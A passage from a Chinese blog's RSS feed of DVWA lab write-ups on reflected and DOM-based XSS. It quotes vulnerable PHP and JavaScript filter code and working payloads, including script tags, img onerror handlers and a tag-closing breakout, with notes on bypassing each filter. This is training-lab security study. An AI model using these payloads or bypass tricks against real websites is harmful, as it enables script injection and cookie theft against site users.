&lt;p>最大的困难是&lt;code>strip_tags&lt;/code>，这要放比赛里我就是个寄吧。&lt;/p>
&lt;p>好了不说自己了。XSS三个板块感觉没有多少变化，一个&lt;code>img&lt;/code>的payload就能通杀，感觉有点鸡了，缺乏实感，游戏体验略差。&lt;/p>
&lt;p>暂时就这样吧。&lt;/p></description></item><item><title>DVWA上手记录-反射型XSS</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-10/</link><pubDate>Thu, 28 Apr 2022 16:29:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-10/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>比较简单，快速过。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>服务端把用户提交的内容没有做好过滤就渲染到了网页上。只有后端渲染才存在这个问题，前后端分离前端渲染的情况都是 DOM XSS。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="收集信息">收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154827171.png"
width="660"
height="135"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154827171_hu2adb11c2fe9b2d42507995e17d6bb15f_12241_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154827171_hu2adb11c2fe9b2d42507995e17d6bb15f_12241_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428154827171"
class="gallery-image"
data-flex-grow="488"
data-flex-basis="1173px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154836075.png"
width="660"
height="149"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154836075_hua43d3cfbe0c99659da43917ac6fbcaab_12541_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154836075_hua43d3cfbe0c99659da43917ac6fbcaab_12541_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428154836075"
class="gallery-image"
data-flex-grow="442"
data-flex-basis="1063px"
>&lt;/p>
&lt;p>尝试注入一个&lt;code>&amp;lt;b&amp;gt;mike&amp;lt;/b&amp;gt;&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154922489.png"
width="665"
height="151"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154922489_huc2c0d0a4afcb0031532bcb3798de4a8d_12727_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428154922489_huc2c0d0a4afcb0031532bcb3798de4a8d_12727_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428154922489"
class="gallery-image"
data-flex-grow="440"
data-flex-basis="1056px"
>&lt;/p>
&lt;p>好，直接开干。&lt;/p>
&lt;h3 id="low难度">Low难度&lt;/h3>
&lt;p>直接插一个 &lt;code>script&lt;/code> 就完了。&lt;code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155023932.png"
width="780"
height="185"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155023932_hu4fc9bdce59acefaa676dc166f92e0a8d_8646_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155023932_hu4fc9bdce59acefaa676dc166f92e0a8d_8646_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428155023932"
class="gallery-image"
data-flex-grow="421"
data-flex-basis="1011px"
>&lt;/p>
&lt;h3 id="medium难度">Medium难度&lt;/h3>
&lt;p>尝试&lt;code>&amp;lt;b&amp;gt;mike&amp;lt;/b&amp;gt;&lt;/code>没有过滤，再试&lt;code>&amp;lt;img src=&amp;quot;&amp;quot; onerror=&amp;quot;alert(1)&amp;quot;/&amp;gt;&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155154196.png"
width="714"
height="182"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155154196_hu21e3d895d30111e19d63cddba4881743_8420_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155154196_hu21e3d895d30111e19d63cddba4881743_8420_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428155154196"
class="gallery-image"
data-flex-grow="392"
data-flex-basis="941px"
>&lt;/p>
&lt;p>已经成功了，再看下代码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="nx">header&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;X-XSS-Protection: 0&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Is there any input?
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">array_key_exists&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$_GET&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="k">NULL&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;script&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;Hello &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">name&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这个情况bypass的方法很多，大小写或者加个空格、多插一个&lt;code>&amp;lt;script&amp;gt;&lt;/code>让服务端替换，都可以。&lt;/p>
&lt;h3 id="high难度">High难度&lt;/h3>
&lt;p>试了下&lt;code>&amp;lt;b&amp;gt;mike&amp;lt;/b&amp;gt;&lt;/code>依然过了，再试一次&lt;code>&amp;lt;img src=&amp;quot;&amp;quot; onerror=&amp;quot;alert(1)&amp;quot;/&amp;gt;&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155519720.png"
width="752"
height="169"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155519720_huf5730712bbef9c59b2d9b44311ac2e8e_7890_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-10/image-20220428155519720_huf5730712bbef9c59b2d9b44311ac2e8e_7890_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428155519720"
class="gallery-image"
data-flex-grow="444"
data-flex-basis="1067px"
>&lt;/p>
&lt;p>又直接过了，行吧&amp;hellip;感觉有点无聊了。再看下代码里怎么防的。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="nx">header&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;X-XSS-Protection: 0&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Is there any input?
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">array_key_exists&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$_GET&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="k">NULL&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">preg_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;/&amp;lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;Hello &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">name&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这正则就有点离谱了=。= 如何构造一个能被这个正则替换过之后还有效的东西呢。然后就想到了转义。&lt;/p>
&lt;p>&lt;code>&amp;lt;&amp;amp;#x73&amp;amp;#x63&amp;amp;#x72&amp;amp;#x69&amp;amp;#x70&amp;amp;#x74&amp;gt;alert(1)&amp;lt;/&amp;amp;#x73&amp;amp;#x63&amp;amp;#x72&amp;amp;#x69&amp;amp;#x70&amp;amp;#x74&amp;gt;&lt;/code>&lt;/p>
&lt;p>但是不行。想了想没有什么太好的办法，毕竟只要顺序出现&lt;code>&amp;lt;script&lt;/code>这些字符就会被淦，而且是整个被淦，在tag中间加tag的办法也行不通。最后想想还是对啊，干嘛非揪着 &lt;code>script&lt;/code> 不放。不用&lt;code>&amp;lt;script&lt;/code>还是有大把的 payload 可以用。&lt;/p>
&lt;p>想想这个过滤还是挺离谱的，目前见过的XSS过滤方法基本都是替换掉了 &lt;code>&amp;lt;&amp;gt;()&lt;/code> 这些字符，反正构造不出函数调用和HTML标签。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>找个更好玩的 XSS 靶场的念头开始增强了。不过多少还有点担心 XSS 漏洞未来会不会退出主流（好像现在就有点退出主流的意思了），学了能不能涨点身价什么的&amp;hellip;想太多。&lt;/p>
&lt;p>没有特别好总结的，利用&lt;code>script&lt;/code>或者别的标签执行 js 就完了。&lt;/p></description></item><item><title>DVWA上手记录-DOM型XSS</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-09/</link><pubDate>Thu, 28 Apr 2022 15:17:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-09/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>终于做到了XSS题。先尝试把DOM型XSS做完。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>用JavaScript操作dom的时候没对用户数据做好过滤，导致将用户数据当HTML/JS解释执行。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="low难度收集信息">Low难度：收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428135841918.png"
width="236"
height="174"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428135841918_hu4fb8acd7cd0e49d8c64eccde34f353bf_9510_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428135841918_hu4fb8acd7cd0e49d8c64eccde34f353bf_9510_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428135841918"
class="gallery-image"
data-flex-grow="135"
data-flex-basis="325px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428135846382.png"
width="326"
height="80"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428135846382_hu3d7c42dc8f2c0cf2c4d6f3ffa934d4b8_3878_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428135846382_hu3d7c42dc8f2c0cf2c4d6f3ffa934d4b8_3878_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428135846382"
class="gallery-image"
data-flex-grow="407"
data-flex-basis="978px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428140052002.png"
width="829"
height="388"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428140052002_hue2c37b2d3cde1cbe15c826517758417d_53138_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428140052002_hue2c37b2d3cde1cbe15c826517758417d_53138_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428140052002"
class="gallery-image"
data-flex-grow="213"
data-flex-basis="512px"
>&lt;/p>
&lt;p>所有值得关注的东西就是这些。&lt;/p>
&lt;p>目标是获取用户的 Cookie。这里就尝试发起一个 CSRF攻击。&lt;/p>
&lt;h3 id="low难度解题">Low难度：解题&lt;/h3>
&lt;p>两个写入DOM的地方，一个是 &lt;code>+ lang +&lt;/code>，一个是 &lt;code>decodeURI(lang)&lt;/code>。&lt;code>decodeURI&lt;/code>更好操作一些，尝试注入一个合法标签，直接写&lt;code>&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428142334193.png"
width="753"
height="193"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428142334193_hu801ceb6c161db13b4cd89d95d6a0474a_6915_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428142334193_hu801ceb6c161db13b4cd89d95d6a0474a_6915_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428142334193"
class="gallery-image"
data-flex-grow="390"
data-flex-basis="936px"
>&lt;/p>
&lt;p>注入成功。&lt;/p>
&lt;h3 id="medium难度解题">Medium难度：解题&lt;/h3>
&lt;p>惊了，看起来js没变化。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">location&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">href&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">indexOf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;default=&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kd">var&lt;/span> &lt;span class="nx">lang&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">location&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">href&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">substring&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">location&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">href&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">indexOf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;default=&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;option value=&amp;#39;&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">lang&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s2">&amp;#34;&amp;#39;&amp;gt;&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nb">decodeURI&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">lang&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;/option&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;option value=&amp;#39;&amp;#39; disabled=&amp;#39;disabled&amp;#39;&amp;gt;----&amp;lt;/option&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;option value=&amp;#39;English&amp;#39;&amp;gt;English&amp;lt;/option&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;option value=&amp;#39;French&amp;#39;&amp;gt;French&amp;lt;/option&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;option value=&amp;#39;Spanish&amp;#39;&amp;gt;Spanish&amp;lt;/option&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;option value=&amp;#39;German&amp;#39;&amp;gt;German&amp;lt;/option&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>尝试用Low难度的payload，发现被跳转：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428142754536.png"
width="661"
height="109"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428142754536_hua8a7f30740a75850eeb95c63d8fbbf4c_10513_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428142754536_hua8a7f30740a75850eeb95c63d8fbbf4c_10513_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428142754536"
class="gallery-image"
data-flex-grow="606"
data-flex-basis="1455px"
>&lt;/p>
&lt;p>大概是做了过滤，虽然有网上随便找的一堆 xss payload 但不想无脑试过去。看一眼源码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">
&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="c1">// Is there any input?
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">array_key_exists&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;default&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$_GET&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">is_null&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;default&amp;#39;&lt;/span> &lt;span class="p">])&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nv">$default&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;default&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="c1"># Do not allow script tags
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">stripos&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$default&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;script&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">!==&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">header&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;location: ?default=English&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">exit&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>一个很鸡的过滤，&lt;code>stripos&lt;/code>忽略大小写所以大小写 bypass 不行，一次 URI 编码也不行。考虑不用 &lt;code>script&lt;/code> 标签，直接把 &lt;code>option&lt;/code>和&lt;code>select&lt;/code> 标签闭合了，然后插一个别的标签比如&lt;code>img&lt;/code>。&lt;/p>
&lt;p>payload就改成这样。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">option&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">select&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">img&lt;/span> &lt;span class="na">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;&amp;#34;&lt;/span> &lt;span class="na">onerror&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">alert(1)&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428144330839-16511282123961.png"
width="761"
height="166"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428144330839-16511282123961_hu65f6cd5bc521de2989168b02384fe0f3_8138_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428144330839-16511282123961_hu65f6cd5bc521de2989168b02384fe0f3_8138_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428144330839"
class="gallery-image"
data-flex-grow="458"
data-flex-basis="1100px"
>&lt;/p>
&lt;p>也暴力解开了。&lt;/p>
&lt;h3 id="high难度解题">High难度：解题&lt;/h3>
&lt;p>还是直接试一次刚才的payload，果不其然302了。看看代码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
